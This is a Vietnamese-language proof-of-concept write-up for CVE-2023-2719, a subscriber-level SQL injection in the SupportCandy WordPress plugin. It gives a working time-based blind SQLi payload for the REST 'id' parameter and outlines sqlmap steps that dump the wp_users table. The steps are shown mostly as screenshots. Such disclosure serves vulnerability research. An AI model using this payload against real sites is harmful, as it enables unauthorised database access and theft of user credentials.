# CVE-2023-2719

- Plugin : SupportCandy
- Phiên bản lỗi : < 3.1.7
- Lỗi : Subscriber+ SQL Injection
- CVSS Score: 8.8 (MEDIUM)

# Mô tả

Plugin không dọn dẹp và thoát tham số `id` đúng cách cho Tác nhân trong API REST trước khi sử dụng nó trong câu lệnh SQL, dẫn đến việc người dùng có vai trò thấp như Subscriber có thể khai thác SQL Injection .

 ![image](https://github.com/Manh130902/wordpress/assets/93723285/aa0c09bf-9c58-4412-a857-48004b61462a)

# POC

- Thông số "id" dễ bị tấn công bởi SQL Injeciton.
  Ví dụ 1: wp-json/supportcandy/v2/agents/234563?id=-1 OR 1%3D(SELECT IF(1%3D1,SLEEP(5),1))
- Truy vấn này sẽ trì hoãn tải trang 5 giây

# Khai Thác

- Bắt request kiểm tra xem thời gian phản hồi của trang là bao lâu

![image](https://github.com/Manh130902/wordpress/assets/93723285/7b928546-c883-42e1-9de3-6498107c05ce)

- Ta để ý thời gian trả về lớn hơn 5 giây
- Sử dụng công cụ Sqlmap để thực hiện dump dữ liệu
B1: Xác định lỗi là time-based blind sqli

![image](https://github.com/Manh130902/wordpress/assets/93723285/262c1fa1-6043-4e3d-8c50-333a0495660a)

B2: Dump bảng trong information_schema

![image](https://github.com/Manh130902/wordpress/assets/93723285/1892a461-207c-4c0b-ab97-c9a553a843fa)
![image](https://github.com/Manh130902/wordpress/assets/93723285/93d9b457-2627-4180-97de-09f108816b8f)


B3: Dump cột trong bảng wp_users

![image](https://github.com/Manh130902/wordpress/assets/93723285/feecf092-bc60-4e35-affa-0c0d4a03c035)
![image](https://github.com/Manh130902/wordpress/assets/93723285/466954c2-b853-42ee-b286-5d26a9fb51f3)

B4: Dump giá trị các cột trong bảng wp_users

![image](https://github.com/Manh130902/wordpress/assets/93723285/dd381601-9c52-4021-8da8-e017cc6fefb0)
![image](https://github.com/Manh130902/wordpress/assets/93723285/a0c95607-95c0-4db9-9bf6-148a4a95a20a)
